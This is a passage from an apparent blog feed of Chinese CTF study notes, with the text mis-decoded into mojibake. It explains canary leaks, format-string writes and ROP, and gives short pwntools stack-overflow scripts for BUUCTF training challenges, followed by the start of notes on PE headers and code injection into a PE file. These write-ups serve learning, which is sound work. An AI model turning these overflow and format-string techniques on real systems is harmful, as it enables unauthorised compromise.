çš„å€¼å…·æœ‰ä¸å¯é¢„æµ‹æ€§ï¼Œæ‰€ä»¥éœ€è¦åŠ¨æ€çš„æ–¹æ³•è¿›è¡Œæ³„éœ²ï¼Œä¸€èˆ¬å¸¸ç”¨çš„æ–¹æ³•å°±æ˜¯é€šè¿‡<strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²</strong>æ¼æ´æ¥è¾“å‡º <strong>Canary</strong> çš„å€¼ï¼Œæˆ–è€…æ˜¯ç”¨ <strong>[æ ˆæº¢å‡ºï¼Œè¾“å‡ºæ ˆå†…å®¹]</strong> çš„å½¢å¼æ¥è¾“å‡º <strong>Canary</strong><br>ä½†æ˜¯ç”±äº <strong>Canary</strong> çš„è®¾è®¡è€…è€ƒè™‘åˆ°äº† <strong>Canary</strong> è¢«è¯¯æ³„éœ²çš„å¯èƒ½æ€§ï¼Œå› æ­¤å¼ºåˆ¶è§„å®š <strong>Canary</strong> çš„æœ€åä¸¤ä½å¿…é¡»æ˜¯ 00ã€‚æ‰€ä»¥åœ¨è¾“å‡ºçš„æ—¶å€™ä¼šè¢« 00 æˆªæ–­ï¼Œè€Œæˆ‘ä»¬åªéœ€è¦å¤šè¦†ç›–ä¸€ä½ï¼ŒæŠŠ \x00 ç»™è¦†ç›–æ‰ï¼Œç„¶åè¯»å–çš„æ—¶å€™å†æ›¿æ¢æˆ \x00 å³å¯ã€‚</p><p>æˆ‘çš„ç†è§£ï¼šé€šè¿‡è°ƒè¯•å®šä½åˆ° <strong>Canary</strong> çš„åœ°å€ï¼Œç„¶ååˆ©ç”¨ <strong>%[OffSet]$x</strong> æ¥è¯»å–æ•°æ®ã€‚**%[OffSet]** è¡¨ç¤ºå¾€åç§»åŠ¨ <strong>[OffSet]</strong> ä¸ªå‚æ•°ã€‚<br>è€Œä¸”å­—ç¬¦ä¸²æ¼æ´æ³„éœ²æ˜¯å¯ä»¥åˆ©ç”¨ <strong>%n</strong> æ¥å†™å…¥æ•°æ®çš„ï¼Œå†™å…¥çš„æ•°æ®ä¸ºå·²ç»è¾“å‡ºçš„å­—ç¬¦ä¸²ã€‚</p><p>æ‰€ä»¥å¯ä»¥é…åˆ <strong>printf (â€œp32 (åœ°å€)%[OffSet]% nâ€);</strong> <strong>[OffSet]</strong> æ˜¯æŒ‡å‘ p32 (åœ°å€) çš„ä½ç½®ï¼Œæ¥è¾¾åˆ°å†™æŒ‡å®šçš„ (åœ°å€) çš„ç›®çš„ï¼Œè¿™ä¸ªä¾‹å­åº”è¯¥å†™å…¥çš„æ˜¯ä¸€å­—èŠ‚çš„ 0x4ã€‚<br>è€Œä¸”å½“æˆ‘ä»¬éœ€è¦è¦å¯¹ä¸€ä¸ªåœ°å€å†™å…¥ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œä¾‹å¦‚ 0x12345678 æ—¶ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¸ç›´æ¥å†™å…¥ï¼Œè€Œæ˜¯åˆ©ç”¨ h æˆ– hhï¼Œåˆ†è‹¥å¹²æ¬¡å†™å…¥ã€‚</p><p>% d ç”¨äºè¯»å– 10 è¿›åˆ¶æ•°å€¼ % x ç”¨äºè¯»å– 16 è¿›åˆ¶æ•°å€¼<br>% s ç”¨äºè¯»å–å­—ç¬¦ä¸²å€¼ å³æ³„éœ²ä»»æ„åœ°å€ä¿¡æ¯ (ä¼ å…¥æŒ‡é’ˆï¼Œè®¿é—®æŒ‡é’ˆä½ç½®çš„å†…å®¹ï¼Œåˆ° x0 ç»“æŸ)<br>% n ç”¨äºæŠŠå‰é¢å·²ç»æ‰“å°çš„é•¿åº¦å†™å…¥æŸä¸ªå†…å­˜åœ°å€ï¼ˆæŠŠæ ˆçš„åœ°å€å½“ä½œæŒ‡é’ˆï¼Œå‘å®ƒæŒ‡å‘çš„åœ°å€å†™ï¼‰<br>% n å†™å…¥ 4 ä¸ªå­—èŠ‚ï¼Œ% hn å†™å…¥ 2 ä¸ªå­—èŠ‚ï¼Œ% hhn å†™å…¥ 1 ä¸ªå­—èŠ‚ã€‚</p><h2 id="3-NX"><a href="#3-NX" class="headerlink" title="3.NX"></a>3.NX</h2><p><strong>Non-Executable Memory</strong>ï¼Œä¸å¯æ‰§è¡Œå†…å­˜ã€‚<br>äº†è§£ Linux çš„éƒ½çŸ¥é“å…¶æ–‡ä»¶æœ‰ä¸‰ç§å±æ€§ï¼Œå³ rwxï¼Œè€Œ NX å³æ²¡æœ‰ x å±æ€§ã€‚<br>å¦‚æœæ²¡æœ‰ w å±æ€§ï¼Œæˆ‘ä»¬å°±ä¸èƒ½å‘å†…å­˜å•å…ƒä¸­å†™å…¥æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰ x å±æ€§ï¼Œå†™å…¥çš„ shellcode å°±æ— æ³•æ‰§è¡Œã€‚<br>æ‰€ä»¥ï¼Œæˆ‘ä»¬æ­¤æ—¶åº”è¯¥ä½¿ç”¨å…¶ä»–æ–¹æ³•æ¥ pwn æ‰ç¨‹åºï¼Œå…¶ä¸­æœ€å¸¸è§çš„æ–¹æ³•ä¸º ROP (Return-Oriented Programming  è¿”å›å¯¼å‘ç¼–ç¨‹)ï¼Œåˆ©ç”¨æ ˆæº¢å‡ºåœ¨æ ˆä¸Šå¸ƒç½®åœ°å€ï¼Œæ¯ä¸ªå†…å­˜åœ°å€å¯¹åº”ä¸€ä¸ª gadgetï¼Œåˆ©ç”¨ ret ç­‰æŒ‡ä»¤è¿›è¡Œè¡”æ¥æ¥æ‰§è¡ŒæŸé¡¹åŠŸèƒ½ï¼Œæœ€ç»ˆè¾¾åˆ° pwn  æ‰ç¨‹åºçš„ç›®çš„ã€‚<br>æˆ‘çš„ç†è§£ï¼Œä¸èƒ½åœ¨æ ˆä¸Šç›´æ¥å†™ <strong>Shellcode</strong> å¹¶ä¸”æ‰§è¡Œï¼Œä½†æ˜¯å¯ä»¥ ROP (å³é€šè¿‡ <strong>ret</strong> çš„æ—¶å€™è½¬åˆ°çš„åœ°å€æ¥æ§åˆ¶ç¨‹åºè¿è¡Œæƒé™)ã€‚</p><h1 id="æ ˆæº¢å‡º"><a href="#æ ˆæº¢å‡º" class="headerlink" title="æ ˆæº¢å‡º"></a>æ ˆæº¢å‡º</h1><h2 id="buuctf-rip"><a href="#buuctf-rip" class="headerlink" title="buuctf rip"></a>buuctf rip</h2><p>ç”¨file å’Œ checksec â€“file pwn1 </p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722184221.png" alt="image-20210722184219109"></p><p>æ²¡æœ‰ä»»ä½•é˜²æŠ¤æŠ€æœ¯</p><p>ç”¨idaæ‰“å¼€çœ‹çœ‹æ±‡ç¼–ä»£ç </p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722192745.png" alt="image-20210722192745826"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722192811.png" alt="image-20210722192811082"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722192756.png" alt="image-20210722192756049"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722192817.png" alt="image-20210722192817599"></p><p>åœ¨çœ‹çœ‹sæœ‰å¤šå¤§ï¼ˆsä¸ºå±€éƒ¨å˜é‡ï¼‰</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722193433.png" alt="image-20210722193433038"></p><p>0F åˆ° 01 15ä¸ª</p><p>**æ³¨æ„åˆ° åé¢è¿˜æœ‰ db 8 dup(?)     **</p><p>**dbï¼š å®šä¹‰å­—èŠ‚ç±»å‹å˜é‡çš„ä¼ªæŒ‡ä»¤     **</p><p>**dup()ï¼š é‡å¤å®šä¹‰åœ†æ‹¬å·ä¸­æŒ‡å®šçš„åˆå€¼ï¼Œæ¬¡æ•°ç”±å‰é¢çš„æ•°å€¼å†³å®š    **</p><p><strong>?ï¼š åªåˆ†é…å­˜å‚¨ç©ºé—´ï¼Œä¸æŒ‡å®šåˆå€¼</strong></p><p>åŠ¨è°ƒæŸ¥çœ‹åç§»</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210722203848.png" alt="image-20210722203847947"></p><p>401186</p><p>ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *s = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28466</span>)buf = <span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>  + p64(<span class="number">0x401186</span>)s.sendline(buf)s.interactive()åå¼¹shellå¾—åˆ°flag</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚æœè€ƒè™‘å †æ ˆå¹³è¡¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *s = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28466</span>)payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">23</span> + p64(<span class="number">0x401186</span> + <span class="number">1</span>)s.sendline(payload)s.interactive()</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿˜éœ€è¦ä»æ ˆé‡Œå‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *s = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28466</span>)buf = <span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x401198</span>) + p64(<span class="number">0x401186</span>)s.sendline(buf)s.interactive()<span class="comment">#&#x27;a&#x27; å‰é¢çš„ bæ˜¯ä¸ºäº†é˜²æ­¢python3è¿è¡Œæ—¶å‡ºç°ä»¥ä¸‹é”™è¯¯</span></span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>ç”¨idaæŸ¥çœ‹</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210723194039.png" alt="image-20210723194039329"></p><p>è¿™éƒ½æ˜¯åœ¨ä¸»å‡½æ•°é‡Œä¸ç”¨è€ƒè™‘è¦†ç›–rbpçš„é—®é¢˜ï¼Œå°±ä¸ç”¨ç®¡ï¼Œç›´æ¥ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26353</span>)payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">44</span> +  p64(<span class="number">0x41348000</span>)r.sendline(payload)r.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210726100343.png" alt="image-20210726100333022"></p><p>i386-32</p><p>ç”¨idaæ‰“å¼€ï¼ŒæŸ¥çœ‹å…³é”®å‡½æ•°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725202445.png" alt="image-20210725202445260"></p><p>fget(s,32,edata)é™åˆ¶äº†è¾“å…¥çš„å­—ç¬¦ä¸²çš„é•¿åº¦ä¸º32ï¼Œæ— æ³•å¸¸è§„æº¢å‡º</p><p>æ¥ç€çœ‹çœ‹å‡½æ•°åé¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::allocatorallocatorç±»è¯¦è§£ï¼šhttps://blog.csdn.net/fengbingchun/article/details/78943527è¿™å°±ç›¸å½“äºåˆ†é…å†…å­˜</span><br></pre></td></tr></table></figure><p>å‘ç°é¢˜ç›®å°†è¾“å…¥çš„å­—ç¬¦ä¸²ä¸­çš„â€Iâ€è½¬ä¸ºâ€youâ€ï¼Œåœ¨é€šè¿‡strcpyèµ‹ç»™sï¼Œå¯ä»¥é€šè¿‡è¾“å…¥å¤šä¸ªâ€Iâ€è¾¾åˆ°æ ˆæº¢å‡ºçš„ç›®çš„ï¼Œé¢˜ç›®ç»™såˆ†é…äº†0x3cçš„ç©ºé—´ï¼Œé‚£å°±æ˜¯éœ€è¦20ä¸ªâ€Iâ€ï¼Œçœ‹çœ‹éœ€è¦æº¢å‡ºåˆ°å“ª</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210726104903.png" alt="image-20210726104903528"></p><p>ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25135</span>)payload = <span class="string">b&#x27;I&#x27;</span>* <span class="number">20</span> + <span class="string">b&quot;a&quot;</span>*<span class="number">4</span> + p32(<span class="number">0x8048F0D</span>)r.sendline(payload)r.interactive()</span><br></pre></td></tr></table></figure><h2 id="EasyCTF-2017-doubly-dangerous"><a href="#EasyCTF-2017-doubly-dangerous" class="headerlink" title="EasyCTF 2017-doubly_dangerous"></a>EasyCTF 2017-doubly_dangerous</h2><p>ç”¨checksecæŸ¥çœ‹</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108091118538.png" alt="image-20210809111822304"></p><p>ç”¨idaæ‰“å¼€ç®€å•åˆ†æ</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108091121091.png" alt="image-20210809112141033"></p><p>ç›´æ¥åˆ©ç”¨getæº¢å‡ºåˆ°give_flag()å¤±è´¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *setting = 0<span class="keyword">if</span> setting == <span class="number">0</span>:    r = process(<span class="string">&quot;./doubly_dangerous&quot;</span>)<span class="keyword">else</span>:    r = remote(<span class="string">&quot;&quot;</span>,)s = 0x08048665payload =  <span class="string">&#x27;a&#x27;</span>*<span class="number">64</span> + p32(s)r.recvuntil(<span class="string">&quot;Give me a string:&quot;</span>)r.sendline(payload)r.interactive()</span><br></pre></td></tr></table></figure><p>æ¢ä¸€ç§æ€è·¯ï¼Œæº¢å‡ºåˆ°v5é‚£æŠŠv5æ”¹æˆ11.28125</p><p>å…ˆçœ‹ä¸€ä¸‹ä¸»å‡½æ•°</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108091127700.png" alt="image-20210809112745640"></p><p><strong>æµ®ç‚¹æŒ‡ä»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fld ç±»ä¼¼äº pushfstp ç±»ä¼¼äº popfadd ç±»ä¼¼äº addfucomip ç±»ä¼¼äº cmp</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108091128842.png" alt="image-20210809112823791"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108091128925.png" alt="image-20210809112840882"></p><p>æµ®ç‚¹æ•°æ˜¯å¤§ç«¯å­˜å‚¨ï¼Œæ‰€ä»¥éœ€è¦å°†v5è¦†ç›–ä¸º0x41348000</p><p>ç°åœ¨æ¥æ‰¾è¦†ç›–ç‚¹</p><p>gdbè¿è¡Œè¾“å…¥aaaa</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108091130508.png" alt="image-20210809113026461"></p><p>å­˜æ”¾s[64]çš„ä½ç½®æ˜¯0xffffcefc</p><p>å­˜v5çš„ä½ç½®æ˜¯0xffffcf3c</p><p>ç›¸å‡å¾—åˆ°è·ç¦»ä¸º0x40</p><p>é‚£å°±æ˜¯ä¸Šè„šæœ¬äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *setting = 0<span class="keyword">if</span> setting == <span class="number">0</span>:    r = process(<span class="string">&quot;./doubly_dangerous&quot;</span>)<span class="keyword">else</span>:    r = remote(<span class="string">&quot;&quot;</span>,)s = 0x41348000payload =  <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p32(s)r.recvuntil(<span class="string">&quot;Give me a string:&quot;</span>)r.sendline(payload)r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwnåˆå­¦ç¬”è®°&quot;&gt;&lt;a href=&quot;#pwnåˆå­¦ç¬”è®°&quot; class=&quot;headerlink&quot; title=&quot;pwnåˆå­¦ç¬”è®°&quot;&gt;&lt;/a&gt;pwnåˆå­¦ç¬”è®°&lt;/h1&gt;&lt;p&gt;å¸ˆå‚…ä»¬çš„å­¦ä¹ åšå®¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>PEå­¦ä¹ ç¬”è®°</title>
    <link href="http://example.com/2021/08/13/PE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2021/08/13/PE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-08-13T11:39:43.642Z</published>
    <updated>2021-08-13T07:51:24.856Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PEå­¦ä¹ ç¬”è®°"><a href="#PEå­¦ä¹ ç¬”è®°" class="headerlink" title="PEå­¦ä¹ ç¬”è®°"></a>PEå­¦ä¹ ç¬”è®°</h1><p>æœ‰ä¸€è¯´ä¸€ï¼Œè‡ªå·±çœ‹å®Œä¹¦åœ¨çœ‹çœ‹è§†é¢‘ï¼Œå¯ä»¥è‡ªå·±å†™ä¸€ä¸¤ä¸ªç¨‹åºï¼ˆæ¯”å¦‚è¾“å‡ºhello worldï¼‰æ¥å®æˆ˜åˆ†æä¸€ä¸‹ï¼Œå°è±¡ä¼šæ›´æ·±ã€‚</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715192740.png" alt="image-20210704165647109"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193305.png" alt="image-20210324212714865"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193312.png" alt="æ–‡ä»¶å›¾"></p><h2 id="DOSå±æ€§è¯´æ˜"><a href="#DOSå±æ€§è¯´æ˜" class="headerlink" title="DOSå±æ€§è¯´æ˜"></a>DOSå±æ€§è¯´æ˜</h2><p>MZæ ‡è¯†ï¼ˆe_magicï¼‰ä¸èƒ½åŠ¨ï¼Œ+3Cä½ç½®çš„e_lfanewä¸èƒ½åŠ¨ï¼Œä¸­é—´çš„éƒ½å¯ä»¥æ”¹åŠ¨ï¼Œä¸­é—´çš„æ˜¯ç»™16ä½çœ‹çš„ï¼Œç°åœ¨æ˜¯32/64ä½çš„ç³»ç»Ÿï¼Œä¸éœ€è¦è¿™éƒ¨åˆ†ã€‚åŒæ—¶DOS Stubå¯ä»¥éšæ„æ›´æ”¹ä¸å½±å“ã€‚</p><h2 id="PEå¤´å±æ€§è¯´æ˜"><a href="#PEå¤´å±æ€§è¯´æ˜" class="headerlink" title="PEå¤´å±æ€§è¯´æ˜"></a>PEå¤´å±æ€§è¯´æ˜</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> struct_IMAGE_NT_HEADERS &#123;</span><br><span class="line">DWORD Signature; <span class="comment">//PEæ ‡è¯†ï¼ˆ4å­—èŠ‚</span></span><br><span class="line">IMAGE_FILE_HEADER FileHeader;<span class="comment">//æ ‡å‡†PEå¤´ï¼ˆ20å­—èŠ‚</span></span><br><span class="line">IMAGE_OPTIONAL_HEADER32 OptionalHeader;<span class="comment">//æ‰©å±•PEå¤´ï¼ˆ224å­—èŠ‚</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32,*PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><h3 id="PEæ ‡è¯†"><a href="#PEæ ‡è¯†" class="headerlink" title="PEæ ‡è¯†"></a>PEæ ‡è¯†</h3><p>0004550h=======â€PE00â€</p><h3 id="IMAGE-FILE-HEADER-FileHeader-æ ‡å‡†PEå¤´"><a href="#IMAGE-FILE-HEADER-FileHeader-æ ‡å‡†PEå¤´" class="headerlink" title="IMAGE_FILE_HEADER FileHeader;æ ‡å‡†PEå¤´"></a>IMAGE_FILE_HEADER FileHeader;æ ‡å‡†PEå¤´</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> struct__IMAGE_FILE_HEADER &#123;</span><br><span class="line">WORD Machine;<span class="comment">//å¯ä»¥è¿è¡Œåœ¨ä»€ä¹ˆæ ·çš„CPUä¸Šä»»æ„:0Intel 386ä»¥åŠåç»­:14C x64:8664</span></span><br><span class="line">wORD NumberOfSections;<span class="comment">//è¡¨ç¤ºèŠ‚çš„æ•°é‡</span></span><br><span class="line">DWORD TimeDateStamp;<span class="comment">//ç¼–è¯‘å™¨å¡«å†™çš„æ—¶é—´æˆ³ä¸æ–‡ä»¶å±æ€§é‡Œé¢(åˆ›å»ºæ—¶é—´ã€ä¿®æ”¹æ—¶é—´)æ— å…³ï¼ˆ1970å¹´åˆ°ç¼–è¯‘å™¨ç¼–è¯‘æ®µç¨‹åº</span></span><br><span class="line">DWORD PointerToSymbolTable;<span class="comment">//è°ƒè¯•ç›¸å…³</span></span><br><span class="line">DWORD NumberOfSymbols;<span class="comment">//è°ƒè¯•ç›¸å…³</span></span><br><span class="line">WORD SizeOf0ptionalHeader;<span class="comment">//å¯é€‰PEå¤´çš„å¤§å°(32ä½PEæ–‡ä»¶:OxE0 64ä½PEæ–‡ä»¶:OxF0)</span></span><br><span class="line">WORD Characteristics;<span class="comment">//æ–‡ä»¶å±æ€§</span></span><br><span class="line">&#125;IMAGE_FILE_HEADER,*PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p>C:\Windowsä¸‹ä¸¤ä¸ªæ–‡ä»¶å¤¹</p><p>System32å­˜å‚¨64ä½ç¨‹åºï¼ŒSysWOW64å­˜å‚¨32ä½ç¨‹åº</p><p> Characteristics å°†ä»–çš„å­—èŠ‚è½¬å­˜äºŒè¿›åˆ¶</p><p>æ¯”å¦‚<img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193320.png" alt="image-20210324215838182"></p><p>æ­¤æ—¶æ˜¯å·¦å°å³å¤§ï¼Œå°ç«¯å­˜å‚¨è¦ä¿®æ”¹ä½ç½®</p><p>0127</p><p>è½¬æˆäºŒè¿›åˆ¶</p><p>0000 0001 0010 0111</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193324.png" alt="image-20210325125852801"></p><h3 id="IMAGE-OPTIONAL-HEADER32-OptionalHeader-æ‰©å±•PEå¤´"><a href="#IMAGE-OPTIONAL-HEADER32-OptionalHeader-æ‰©å±•PEå¤´" class="headerlink" title="IMAGE_OPTIONAL_HEADER32 OptionalHeader;æ‰©å±•PEå¤´"></a>IMAGE_OPTIONAL_HEADER32 OptionalHeader;æ‰©å±•PEå¤´</h3><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193517.png" alt="image-20210325170912232"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193513.png" alt="image-20210325171126065"></p><h2 id="èŠ‚è¡¨æ•°æ®ç»“æ„"><a href="#èŠ‚è¡¨æ•°æ®ç»“æ„" class="headerlink" title="èŠ‚è¡¨æ•°æ®ç»“æ„"></a>èŠ‚è¡¨æ•°æ®ç»“æ„</h2><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193333.png" alt="image-20210325190344706"></p><p><strong>èŠ‚å±æ€§è¯´æ˜</strong></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193337.png" alt="image-20210325190357790"></p><h3 id="RVAå’ŒFOAçš„è½¬æ¢"><a href="#RVAå’ŒFOAçš„è½¬æ¢" class="headerlink" title="RVAå’ŒFOAçš„è½¬æ¢"></a>RVAå’ŒFOAçš„è½¬æ¢</h3><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193348.png" alt="image-20210325190859385"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">VAï¼šè™šæ‹Ÿå†…å­˜åœ°å€ï¼ˆVirtual Addressï¼‰PE æ–‡ä»¶è¢«æ“ä½œç³»ç»ŸåŠ è½½è¿›å†…å­˜åçš„åœ°å€ã€‚</span><br><span class="line">RVAï¼šPEæ–‡ä»¶çš„ç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼ˆRelative Virual Addressï¼‰æ˜¯PEæ–‡ä»¶ä¸­çš„æ•°æ®ã€æ¨¡å—ç­‰è¿è¡Œåœ¨å†…å­˜ä¸­çš„å®é™…åœ°å€ç›¸å¯¹PEæ–‡ä»¶è£…è½½åˆ°å†…å­˜çš„åŸºå€ä¹‹é—´çš„è·ç¦»ã€‚ä¸¾ä¾‹è¯´æ˜ï¼Œå¦‚æœPEæ–‡ä»¶è£…å…¥è™šæ‹Ÿåœ°å€(VA)ç©ºé—´çš„400000hå¤„ï¼Œä¸”è¿›ç¨‹ä»è™šå€401000hå¼€å§‹æ‰§è¡Œï¼Œæˆ‘ä»¬å¯ä»¥è¯´è¿›ç¨‹æ‰§è¡Œèµ·å§‹åœ°å€åœ¨RVA 1000hã€‚</span><br><span class="line">FOAï¼šæ–‡ä»¶åç§»åœ°å€ï¼ˆFile Offset Addressï¼‰ï¼Œå’Œå†…å­˜æ— å…³ï¼Œå®ƒæ˜¯æŒ‡æŸä¸ªä½ç½®è·ç¦»æ–‡ä»¶å¤´çš„åç§»ã€‚</span><br><span class="line"></span><br><span class="line">//å­¦ä¹ é“¾æ¥ï¼šhttps://blog.csdn.net/weixin_43742894/article/details/105235629</span><br><span class="line"></span><br><span class="line">RVAåˆ°FOAçš„è½¬æ¢:</span><br><span class="line">&lt;1&gt; å¾—åˆ°RVAçš„å€¼:å†…å­˜åœ°å€-lmageBase</span><br><span class="line">&lt;2&gt; åˆ¤æ–­RVAæ˜¯å¦ä½äºPEå¤´ä¸­ï¼Œå¦‚æœæ˜¯:FOA== RVA</span><br><span class="line">&lt;3&gt; åˆ¤æ–­RVAä½äºå“ªä¸ªèŠ‚:</span><br><span class="line">RVA&gt;=èŠ‚.VirtualAddress &amp;&amp; RVA&lt;=èŠ‚.VirtualAddress +å½“å‰èŠ‚å†…å­˜å¯¹é½åçš„å¤§å°</span><br><span class="line">å·®å€¼ = RVA - èŠ‚.VirtualAddress;</span><br><span class="line">&lt;4&gt; FOA = èŠ‚.PointerToRawData + å·®å€¼;</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">DWORD SectionAlignment1000h128h4hFg: Bg:0xFFE0FF</span><br><span class="line">DWORD FileAlignment200h12Ch4hFg: Bg:0xFFE0FF</span><br><span class="line">DWORD SizeOfHeaders400h144h4hFg: Bg:0xFFE0FF</span><br><span class="line">DWORD VirtualAddressE260h168h4hFg: Bg:0xFFE0FF.text FOA = 0xD660 </span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210720202153.png" alt="image-20210720202153131"></p><p>E260h &lt;= 1000h+D400h</p><p>RVA&lt;=èŠ‚.VirtualAddress +å½“å‰èŠ‚å†…å­˜å¯¹é½åçš„å¤§å°</p><p>E260h - 1000h = D260h</p><p>FOA = D260h +400h = D660h</p><h2 id="ç©ºç™½åŒºåŸŸæ·»åŠ ä»£ç "><a href="#ç©ºç™½åŒºåŸŸæ·»åŠ ä»£ç " class="headerlink" title="ç©ºç™½åŒºåŸŸæ·»åŠ ä»£ç "></a>ç©ºç™½åŒºåŸŸæ·»åŠ ä»£ç </h2><p>å¼¹å‡ºé”™è¯¯å¼¹çª—ä¾‹å­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MessageBox(0,0,0,0); 